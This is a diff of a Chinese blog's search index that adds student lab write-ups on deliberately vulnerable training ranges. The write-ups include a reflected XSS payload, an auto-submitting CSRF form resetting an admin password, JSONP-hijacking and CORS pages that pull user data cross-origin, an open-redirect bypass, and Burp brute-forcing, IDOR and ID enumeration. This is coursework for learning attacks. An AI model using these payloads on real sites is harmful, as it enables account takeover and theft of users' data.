+    <title>前端漏洞靶场环境——front</title>
+    <url>/2023/11/27/%E5%89%8D%E7%AB%AF%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E2%80%94%E2%80%94front/</url>
+    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：前端漏洞靶场环境——front(系统有两个用户： user1&#x2F;user1 、admin1&#x2F;admin1)，要求提交实验报告</p>
+<ol>
+<li>挖掘环境中的反射型XSS漏洞，（以弹框 test13 证明）</li>
+<li>复现环境中的CSRF漏洞，设计表单，当管理员点击URL以后自动将自己的密码重置为：123456</li>
+<li>复现环境中JSON Hijacking漏洞，在另一个网站（或本机另一个端口）获取用户信息</li>
+<li>通过在服务器Web目录创建.htaccess文件，控制服务器响应头，实现CORS漏洞，在另一网站，接收HTML接口的用户信息。</li>
+<li>挖掘环境中的URL跳转漏洞，构造请求，跳转到重邮官网</li>
+</ol>
+<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>进入靶场文件目录下输入<code>docker-compose up -d</code>启动靶场，访问<code>http://192.168.37.128:8983</code>即可</p>
+<h1 id="漏洞挖掘与复现"><a href="#漏洞挖掘与复现" class="headerlink" title="漏洞挖掘与复现"></a>漏洞挖掘与复现</h1><h2 id="反射型XSS漏洞"><a href="#反射型XSS漏洞" class="headerlink" title="反射型XSS漏洞"></a>反射型XSS漏洞</h2><p>使用用户名user1与密码user1登录<img data-src="https://images.gaifagafin.top/202312011004731.png"></p>
+<p>查看网站源码，发现参数<code>name</code>处可能存在XSS漏洞</p>
+<p><img data-src="https://images.gaifagafin.top/202312011004043.png"></p>
+<p>尝试构造PoC并发送，成功弹窗，证明存在反射型XSS漏洞</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://192.168.37.128:8983/front/info.php?name=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;test 13&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img data-src="https://images.gaifagafin.top/202312011004158.png"></p>
+<h2 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h2><p>抓包查看用户点击修改密码时发送给服务器的数据包，可以看到新密码<code>newpassword</code>和确认密码<code>passwordrepeat</code>都是用<strong>POST</strong>传参</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/front/info.php?name=</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.37.128:8983</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>38</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.37.128:8983</span><br><span class="line"><span class="attribute">Sec-GPC</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.37.128:8983/front/info.php?name=</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uid=dXNlcjE%3D; is_ad=1; PHPSESSID=ggoq5vok58252u9sdl3i043981</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-haxe"><span class="keyword">new</span><span class="type">password</span>=user1&amp;passwordrepeat=user1</span></span><br></pre></td></tr></table></figure>
+
+<p>开启攻击机的网络服务，在攻击机的www目录下建立一个html页面(<code>192.168.137.1:8888/test.html</code>)，构造修改密码功能表单，一旦受害者访问此页面，密码就会被改成<code>123456</code>，构造表单如下</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;myform&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.37.128:8983/front/info.php?name=&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;newpassword&quot;</span> <span class="attr">value</span>= <span class="string">&quot;123456&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;passwordrepeat&quot;</span> <span class="attr">value</span>= <span class="string">&quot;123456&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- javascript自动提交 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> myform=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;myform&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    myform.<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>使用无痕浏览模式打开新窗口模拟管理员登录后并”不小心”访问URL<code>192.168.137.1:8888/test.html</code>以后，页面会自动提交事先构造的表单，这时密码已经被修改，用之前的密码admin1登录管理员显示登陆失败</p>
+<p><img data-src="https://images.gaifagafin.top/202312011006537.png"></p>
+<p>使用修改后的密码123456可以成功登录admin1账号</p>
+<p><img data-src="https://images.gaifagafin.top/202312011006796.png"></p>
+<h2 id="JSON-HiJacking漏洞"><a href="#JSON-HiJacking漏洞" class="headerlink" title="JSON HiJacking漏洞"></a>JSON HiJacking漏洞</h2><p>使用user1账号登录，发现返回敏感信息，可能存在Hijacking漏洞</p>
+<p><img data-src="https://images.gaifagafin.top/202312011006632.png"></p>
+<p>构建PoC，将代码放入构建的web服务器目录下(<code>http://192.168.137.1:8888/test.html</code>)</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript"> <span class="keyword">function</span> <span class="title function_">hijack</span>(<span class="params">result</span>)</span></span><br><span class="line"><span class="language-javascript">    &#123;  </span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(result);</span></span><br><span class="line"><span class="language-javascript">    &#125;  </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.37.128/userdata.php?callback=hijack&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>使用admin1账户登录模拟管理员访问192.168.137.1:8888&#x2F;test.html，但是页面返回null</p>
+<p><img data-src="https://images.gaifagafin.top/202312011006613.png"></p>
+<p>如果web服务器构建在同一IP地址下，访问<code>192.168.37.128/test.html</code>，查看响应头，可以查看到敏感信息</p>
+<p><img data-src="https://images.gaifagafin.top/202312011006338.png"></p>
+<h2 id="CORS漏洞"><a href="#CORS漏洞" class="headerlink" title="CORS漏洞"></a>CORS漏洞</h2><p>使用user1账户登录，点击个人信息html接口，返回敏感信息并且发现响应头存在<code>Access-Control-Allow-Origin: *</code>,存在CORS漏洞</p>
+<p><img data-src="https://images.gaifagafin.top/202312011006841.png"></p>
+<p>构建PoC，将代码放入构建的web服务器目录下(<code>http://192.168.137.1:8888/test.html</code>)</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> req = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); </span></span><br><span class="line"><span class="language-javascript">    req.<span class="property">onload</span> = reqListener; </span></span><br><span class="line"><span class="language-javascript">    req.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;http://192.168.37.128:8983/front/cors.php&#x27;</span>,<span class="literal">true</span>); </span></span><br><span class="line"><span class="language-javascript">    req.<span class="property">responseType</span>=<span class="string">&quot;text&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">reqListener</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="language-javascript">    &#123; </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (req.<span class="property">readyState</span> === req.<span class="property">DONE</span>)</span></span><br><span class="line"><span class="language-javascript">        &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span>(req.<span class="property">status</span> === <span class="number">200</span>)</span></span><br><span class="line"><span class="language-javascript">            &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">write</span>(req.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125; </span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    req.<span class="title function_">send</span>(<span class="literal">null</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>访问<code>192.168.137.1:8888/test.html</code>，成功跨域获取敏感信息</p>
+<p><img data-src="https://images.gaifagafin.top/202312011006191.png"></p>
+<h2 id="URL跳转漏洞"><a href="#URL跳转漏洞" class="headerlink" title="URL跳转漏洞"></a>URL跳转漏洞</h2><p>使用user1账户登录，点击<code>返回登录页</code>，使用burpsuite抓包，发现存在url跳转</p>
+<p><img data-src="https://images.gaifagafin.top/202312011006727.png"></p>
+<p>将url改成<code>www.cqupt.edu.cn</code></p>
+<p><img data-src="https://images.gaifagafin.top/202312011006446.png"></p>
+<p>发现重定向到网站目录下</p>
+<p><img data-src="https://images.gaifagafin.top/202312011011335.png"></p>
+<p>将url改写成<code>//www.cqupt.edu.cn</code>，点击关注重定向</p>
+<p><img data-src="https://images.gaifagafin.top/202312011007051.png"></p>
+<p>成功跳转到重邮官网</p>
+<p><img data-src="https://images.gaifagafin.top/202312011007821.png"></p>
+]]></content>
+      <categories>
+        <category>漏洞</category>
+      </categories>
+      <tags>
+        <tag>前端漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>关于建站</title>
     <url>/2023/11/05/%E5%85%B3%E4%BA%8E%E5%BB%BA%E7%AB%99/</url>
     <content><![CDATA[<p>作为学生党，搭建博客的时候最优先考虑的就是钱，为了搭建一个性价比最高的博客，我尝试了很多图床</p>
@@ -2298,69 +2361,6 @@ height: 100%; left: 0; top: 0;"> </iframe></div>
       </categories>
       <tags>
         <tag>picture</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>前端漏洞靶场环境——front</title>
-    <url>/2023/11/27/%E5%89%8D%E7%AB%AF%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E2%80%94%E2%80%94front/</url>
-    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：前端漏洞靶场环境——front(系统有两个用户： user1&#x2F;user1 、admin1&#x2F;admin1)，要求提交实验报告</p>
-<ol>
-<li>挖掘环境中的反射型XSS漏洞，（以弹框 test13 证明）</li>
-<li>复现环境中的CSRF漏洞，设计表单，当管理员点击URL以后自动将自己的密码重置为：123456</li>
-<li>复现环境中JSON Hijacking漏洞，在另一个网站（或本机另一个端口）获取用户信息</li>
-<li>通过在服务器Web目录创建.htaccess文件，控制服务器响应头，实现CORS漏洞，在另一网站，接收HTML接口的用户信息。</li>
-<li>挖掘环境中的URL跳转漏洞，构造请求，跳转到重邮官网</li>
-</ol>
-<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>进入靶场文件目录下输入<code>docker-compose up -d</code>启动靶场，访问<code>http://192.168.37.128:8983</code>即可</p>
-<h1 id="漏洞挖掘与复现"><a href="#漏洞挖掘与复现" class="headerlink" title="漏洞挖掘与复现"></a>漏洞挖掘与复现</h1><h2 id="反射型XSS漏洞"><a href="#反射型XSS漏洞" class="headerlink" title="反射型XSS漏洞"></a>反射型XSS漏洞</h2><p>使用用户名user1与密码user1登录<img data-src="https://images.gaifagafin.top/202312011004731.png"></p>
-<p>查看网站源码，发现参数<code>name</code>处可能存在XSS漏洞</p>
-<p><img data-src="https://images.gaifagafin.top/202312011004043.png"></p>
-<p>尝试构造PoC并发送，成功弹窗，证明存在反射型XSS漏洞</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://192.168.37.128:8983/front/info.php?name=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&#x27;test 13&#x27;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p><img data-src="https://images.gaifagafin.top/202312011004158.png"></p>
-<h2 id="CSRF漏洞"><a href="#CSRF漏洞" class="headerlink" title="CSRF漏洞"></a>CSRF漏洞</h2><p>抓包查看用户点击修改密码时发送给服务器的数据包，可以看到新密码<code>newpassword</code>和确认密码<code>passwordrepeat</code>都是用<strong>POST</strong>传参</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/front/info.php?name=</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.37.128:8983</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>38</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://192.168.37.128:8983</span><br><span class="line"><span class="attribute">Sec-GPC</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.37.128:8983/front/info.php?name=</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>uid=dXNlcjE%3D; is_ad=1; PHPSESSID=ggoq5vok58252u9sdl3i043981</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"></span><br><span class="line"><span class="language-haxe"><span class="keyword">new</span><span class="type">password</span>=user1&amp;passwordrepeat=user1</span></span><br></pre></td></tr></table></figure>
-
-<p>开启攻击机的网络服务，在攻击机的www目录下建立一个html页面(<code>192.168.137.1:8888/test.html</code>)，构造修改密码功能表单，一旦受害者访问此页面，密码就会被改成<code>123456</code>，构造表单如下</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">id</span>=<span class="string">&quot;myform&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;http://192.168.37.128:8983/front/info.php?name=&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;newpassword&quot;</span> <span class="attr">value</span>= <span class="string">&quot;123456&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;passwordrepeat&quot;</span> <span class="attr">value</span>= <span class="string">&quot;123456&quot;</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- javascript自动提交 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> myform=<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;myform&quot;</span>);</span></span><br><span class="line"><span class="language-javascript">    myform.<span class="title function_">submit</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>使用无痕浏览模式打开新窗口模拟管理员登录后并”不小心”访问URL<code>192.168.137.1:8888/test.html</code>以后，页面会自动提交事先构造的表单，这时密码已经被修改，用之前的密码admin1登录管理员显示登陆失败</p>
-<p><img data-src="https://images.gaifagafin.top/202312011006537.png"></p>
-<p>使用修改后的密码123456可以成功登录admin1账号</p>
-<p><img data-src="https://images.gaifagafin.top/202312011006796.png"></p>
-<h2 id="JSON-HiJacking漏洞"><a href="#JSON-HiJacking漏洞" class="headerlink" title="JSON HiJacking漏洞"></a>JSON HiJacking漏洞</h2><p>使用user1账号登录，发现返回敏感信息，可能存在Hijacking漏洞</p>
-<p><img data-src="https://images.gaifagafin.top/202312011006632.png"></p>
-<p>构建PoC，将代码放入构建的web服务器目录下(<code>http://192.168.137.1:8888/test.html</code>)</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript"> <span class="keyword">function</span> <span class="title function_">hijack</span>(<span class="params">result</span>)</span></span><br><span class="line"><span class="language-javascript">    &#123;  </span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">alert</span>(result);</span></span><br><span class="line"><span class="language-javascript">    &#125;  </span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://192.168.37.128/userdata.php?callback=hijack&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>使用admin1账户登录模拟管理员访问<a href="http://192.168.137.1:8888/test.html%EF%BC%8C%E4%BD%86%E6%98%AF%E9%A1%B5%E9%9D%A2%E8%BF%94%E5%9B%9Enull">http://192.168.137.1:8888/test.html，但是页面返回null</a></p>
-<p><img data-src="https://images.gaifagafin.top/202312011006613.png"></p>
-<p>如果web服务器构建在同一IP地址下，访问<code>192.168.37.128/test.html</code>，查看响应头，可以查看到敏感信息</p>
-<p><img data-src="https://images.gaifagafin.top/202312011006338.png"></p>
-<h2 id="CORS漏洞"><a href="#CORS漏洞" class="headerlink" title="CORS漏洞"></a>CORS漏洞</h2><p>使用user1账户登录，点击个人信息html接口，返回敏感信息并且发现响应头存在<code>Access-Control-Allow-Origin: *</code>,存在CORS漏洞</p>
-<p><img data-src="https://images.gaifagafin.top/202312011006841.png"></p>
-<p>构建PoC，将代码放入构建的web服务器目录下(<code>http://192.168.137.1:8888/test.html</code>)</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">  </span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">var</span> req = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>(); </span></span><br><span class="line"><span class="language-javascript">    req.<span class="property">onload</span> = reqListener; </span></span><br><span class="line"><span class="language-javascript">    req.<span class="title function_">open</span>(<span class="string">&#x27;get&#x27;</span>,<span class="string">&#x27;http://192.168.37.128:8983/front/cors.php&#x27;</span>,<span class="literal">true</span>); </span></span><br><span class="line"><span class="language-javascript">    req.<span class="property">responseType</span>=<span class="string">&quot;text&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">function</span> <span class="title function_">reqListener</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="language-javascript">    &#123; </span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">if</span> (req.<span class="property">readyState</span> === req.<span class="property">DONE</span>)</span></span><br><span class="line"><span class="language-javascript">        &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span>(req.<span class="property">status</span> === <span class="number">200</span>)</span></span><br><span class="line"><span class="language-javascript">            &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="variable language_">document</span>.<span class="title function_">write</span>(req.<span class="property">responseText</span>);</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125; </span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">    req.<span class="title function_">send</span>(<span class="literal">null</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> </span><br></pre></td></tr></table></figure>
-
-<p>访问<code>192.168.137.1:8888/test.html</code>，成功跨域获取敏感信息</p>
-<p><img data-src="https://images.gaifagafin.top/202312011006191.png"></p>
-<h2 id="URL跳转漏洞"><a href="#URL跳转漏洞" class="headerlink" title="URL跳转漏洞"></a>URL跳转漏洞</h2><p>使用user1账户登录，点击<code>返回登录页</code>，使用burpsuite抓包，发现存在url跳转</p>
-<p><img data-src="https://images.gaifagafin.top/202312011006727.png"></p>
-<p>将url改成<code>www.cqupt.edu.cn</code></p>
-<p><img data-src="https://images.gaifagafin.top/202312011006446.png"></p>
-<p>发现重定向到网站目录下</p>
-<p><img data-src="https://images.gaifagafin.top/202312011011335.png"></p>
-<p>将url改写成<code>//www.cqupt.edu.cn</code>，点击关注重定向</p>
-<p><img data-src="https://images.gaifagafin.top/202312011007051.png"></p>
-<p>成功跳转到重邮官网</p>
-<p><img data-src="https://images.gaifagafin.top/202312011007821.png"></p>
-]]></content>
-      <categories>
-        <category>漏洞</category>
-      </categories>
-      <tags>
-        <tag>前端漏洞</tag>
       </tags>
   </entry>
   <entry>
@@ -3094,6 +3094,73 @@ height: 100%; left: 0; top: 0;"> </iframe></div>
         <tag>Web</tag>
         <tag>LAMP</tag>
         <tag>环境</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>逻辑漏洞靶场环境——logic</title>
+    <url>/2023/12/02/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E9%9D%B6%E5%9C%BA%E7%8E%AF%E5%A2%83%E2%80%94%E2%80%94logic/</url>
+    <content><![CDATA[<h1 id="实验要求"><a href="#实验要求" class="headerlink" title="实验要求"></a>实验要求</h1><p>漏洞环境：逻辑漏洞靶场环境——logic<br>要求提交实验报告<br>1.突破功能限制漏洞。要求突破查询按钮disable限制，获取编号：110010的查询内容（弹框中的flag）。<br>2.用户信息泄漏漏洞。通过回显信息，以暴力破解方式猜测系统中存在的两个用户名(提示：用户名以 “u” 开头)，并暴力破解这两个用户对应的密码。<br>3.越权漏洞。通过上一步破解的用户名密码登录，利用越权漏洞获取admin与admin1的个人信息。<br>4.遍历漏洞。已知当前系统中存在的一个学号为：20190504035XA01。利用遍历漏洞获取其他学号对应的成绩（不少于5条）。<br>5.暴力破解攻击。获取系统中另一个六位数字编号对应的弹框flag内容。</p>
+<h1 id="靶场搭建"><a href="#靶场搭建" class="headerlink" title="靶场搭建"></a>靶场搭建</h1><p>进入靶场文件目录下输入<code>docker-compose up -d</code>启动靶场，访问<code>http://192.168.37.128:8993</code>即可</p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="突破功能限制漏洞"><a href="#突破功能限制漏洞" class="headerlink" title="突破功能限制漏洞"></a>突破功能限制漏洞</h2><p>查询按钮是灰色的，无法被点击</p>
+<p><img data-src="https://images.gaifagafin.top/202312022048006.png"></p>
+<p>按F12进入查看器，定位到按钮的前端功能实现，将<code>disable=&quot;disable&quot;</code>删除后点击查询</p>
+<p><img data-src="https://images.gaifagafin.top/202312022048806.png"></p>
+<p>弹窗获得FLAG：<code>flag&#123;byp4ss1s_ez&#125;</code></p>
+<p><img data-src="https://images.gaifagafin.top/202312022049066.png"></p>
+<h2 id="用户信息泄漏漏洞"><a href="#用户信息泄漏漏洞" class="headerlink" title="用户信息泄漏漏洞"></a>用户信息泄漏漏洞</h2><p>随便输入用户名和密码，提示用户名不正确</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049396.png"></p>
+<p>burpsuite开启代理</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049002.png"></p>
+<p>将请求包发送给intruder，对用户名进行爆破，得到用户名如下</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049622.png"></p>
+<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爆破出的用户名</span></span><br><span class="line"><span class="keyword">user</span></span><br><span class="line"><span class="title">user1</span></span><br><span class="line">admin</span><br><span class="line">admin1</span><br></pre></td></tr></table></figure>
+
+<p>将爆出的用户名装载进有效负载集，爆破密码</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049648.png"></p>
+<figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#爆破出的用户名及密码</span></span><br><span class="line"><span class="keyword">user</span>	<span class="title">888888</span></span><br><span class="line">user1	<span class="number">123456</span></span><br></pre></td></tr></table></figure>
+
+<p>使用爆破出的用户名及密码成功登录</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049308.png"></p>
+<p><img data-src="https://images.gaifagafin.top/202312022049817.png"></p>
+<h2 id="越权漏洞"><a href="#越权漏洞" class="headerlink" title="越权漏洞"></a>越权漏洞</h2><p>burpsuite开启代理，使用user1账号登录，发现第一个数据包cookie中有<code>uid=dXNlcjE%3D</code>字段</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049561.png"></p>
+<p>将<code>dXNlcjE%3D</code>使用url解码，再使用base64解码，得到<code>uid=user1</code>，可知uid和账户名有编码对应关系</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049076.png"></p>
+<p>欲获取获取admin与admin1的个人信息，先将用户名base64编码</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049613.png"></p>
+<p>将第二个数据包中的uid值更换成admin的base64编码，发送数据包，成功获取admin个人信息</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049468.png"></p>
+<p>将第二个数据包中的uid值更换成admin1的base64编码，发送数据包，成功获取admin1个人信息</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049859.png"></p>
+<h2 id="遍历漏洞"><a href="#遍历漏洞" class="headerlink" title="遍历漏洞"></a>遍历漏洞</h2><p>已知当前系统中存在的一个学号为：20190504035XA01，开启burpsuite代理，使用此学号查询</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049755.png"></p>
+<p>根据此学号的格式，推理学号前八位20190504是入学年月日（不变），那么只需要遍历XA之前的三位数字和最后两位数字即可</p>
+<p>将数据包传给intruder模块，使用集束炸弹模式，设置有效载荷</p>
+<p><img data-src="https://images.gaifagafin.top/202312022050820.png"></p>
+<p>将有效载荷选项设置成<strong>暴力</strong>，如下图</p>
+<p><img data-src="https://images.gaifagafin.top/202312022049883.png"></p>
+<p>点击开始攻击，等待一段时间，得到爆破结果</p>
+<p><img data-src="https://images.gaifagafin.top/202312022050568.png"></p>
+<figure class="highlight 1c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#整合出的编号</span></span><br><span class="line"><span class="number">20190504035</span>XA01</span><br><span class="line"><span class="number">20190504035</span>XA02</span><br><span class="line"><span class="number">20190504036</span>XA03</span><br><span class="line"><span class="number">20190504036</span>XA04</span><br><span class="line"><span class="number">20190504037</span>XA05</span><br><span class="line"><span class="number">20190504037</span>XA06</span><br><span class="line"><span class="number">20190504038</span>XA07</span><br><span class="line"><span class="number">20190504038</span>XA08</span><br></pre></td></tr></table></figure>
+
+<p>查询结果</p>
+<p><img data-src="https://images.gaifagafin.top/202312022050882.png"></p>
+<h2 id="暴力破解攻击"><a href="#暴力破解攻击" class="headerlink" title="暴力破解攻击"></a>暴力破解攻击</h2><p>如之前突破功能限制，开启burpsuite代理，按F12将<code>disable=&quot;disable&quot;</code>删除，输入6位数编号查询，抓取数据包</p>
+<p><img data-src="https://images.gaifagafin.top/202312022050498.png"></p>
+<p>将数据包发送到intruder模块，设置如下图</p>
